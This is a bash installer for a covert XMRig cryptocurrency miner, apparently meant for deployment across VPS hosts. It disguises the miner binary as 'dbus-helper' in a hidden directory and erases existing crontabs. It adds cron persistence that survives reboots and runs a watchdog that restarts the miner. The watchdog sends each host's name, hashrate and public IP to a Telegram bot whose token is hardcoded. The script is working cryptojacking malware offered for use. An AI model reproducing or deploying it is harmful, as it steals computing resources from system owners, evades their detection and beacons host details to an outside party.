

#!/bin/bash
# =====================================================
# 80% CPU Persistent XMRig Miner Installer
# Purpose: Install miner + watchdog with auto-restart
#          and persistence on every new VPS.
# =====================================================

echo "[+] Starting 80% CPU Miner Installation..."

# --------------------- 1. CLEANUP OLD VERSION ---------------------
echo "[+] Cleaning previous installations..."
cd ~/.config/.cache 2>/dev/null || mkdir -p ~/.config/.cache && cd ~/.config/.cache

# Kill any running miner and watchdog
pkill -9 -f dbus-helper
pkill -9 -f watch.sh

# Remove old cron jobs
crontab -r 2>/dev/null || true

echo "[+] Cleanup completed."

# --------------------- 2. DOWNLOAD & SETUP MINER ---------------------
echo "[+] Downloading and setting up XMRig..."

curl -fsSL https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz -o x.tar.gz
tar -xzf x.tar.gz --strip-components=1
rm -f x.tar.gz *.md LICENSE SHA256*

mv xmrig dbus-helper          # Rename binary to look like system process
chmod +x dbus-helper

echo "[+] Miner binary ready."

# --------------------- 3. CREATE CONFIG (80% CPU) ---------------------
echo "[+] Creating config.json (locked at 80% CPU)..."

cat > config.json << 'EOF'
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 80,
        "huge-pages": false,
        "yield": false,
        "max-cache": 2048
    },
    "opencl": false,
    "cuda": false,
    "pools": [{
        "url": "pool.supportxmr.com:3333",
        "user": "45pLvfDjyHNLrhd5ekuqZdRUmjkd6ypocYUV8mRaTS5kQGRoWKtUTYg6VpNaCMSmsKWtympm9ruh6Hv55HCuSDXE12NEfwg",
        "pass": "$(whoami)-$(hostname)-80",
        "keepalive": true
    }],
    "donate-level": 0,
    "http": {
        "enabled": true,
        "port": 8080
    }
}
EOF

echo "[+] Config file created (80% CPU limit set)."

# --------------------- 4. CREATE WATCHDOG SCRIPT ---------------------
echo "[+] Creating watch.sh (auto-restart + Telegram reporting)..."

cat > watch.sh << 'EOF'
#!/bin/bash
cd ~/.config/.cache
BOT_TOKEN="7061634577:AAGg-tN8rY2OF87EdRDgfBEmfe2bn2k8DUs"
CHAT_ID="5438707915"

while true; do
    # Restart miner if it dies
    if ! pgrep -f dbus-helper >/dev/null 2>&1; then
        nice -n -15 ./dbus-helper --config=config.json >> watch.log 2>&1 &
        echo "[$(date)] Miner restarted" >> watch.log
        sleep 10
    fi

    # Get current hashrate and IP, then report to Telegram
    HR=$(curl -s http://127.0.0.1:8080/api.json 2>/dev/null | grep -o '"total":\[[0-9.]*' | cut -d'[' -f2 | cut -d'.' -f1 || echo "0")
    IP=$(curl -s ifconfig.me 2>/dev/null || echo "noip")
    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
         -d "chat_id=${CHAT_ID}" \
         -d "text=/phonehome $(hostname)-80 ${HR} ${IP}" >/dev/null 2>&1

    sleep 25
done
EOF

chmod +x watch.sh
echo "[+] Watchdog script created."

# --------------------- 5. START THE MINER ---------------------
echo "[+] Starting miner and watchdog..."
nohup ./watch.sh >/dev/null 2>&1 &

# --------------------- 6. ADD PERSISTENCE (Auto-start on boot) ---------------------
echo "[+] Adding persistence layers..."

# Start on reboot
(crontab -l 2>/dev/null; echo "@reboot nohup ~/.config/.cache/watch.sh >/dev/null 2>&1 &") | crontab -

# Check every minute if miner is dead
(crontab -l 2>/dev/null; echo "* * * * * ~/.config/.cache/.systemd.sh") | crontab -

cat > .systemd.sh << 'EOL'
#!/bin/bash
if ! pgrep -f "dbus-helper" >/dev/null 2>&1; then
    cd ~/.config/.cache && nohup ./watch.sh >/dev/null 2>&1 &
fi
EOL

chmod +x .systemd.sh

echo "[+] Installation Completed Successfully!"
echo "[+] Miner will now run at ~80% CPU, auto-restart on crash, and survive reboots."
echo "[+] Wait 40-60 seconds then check status."
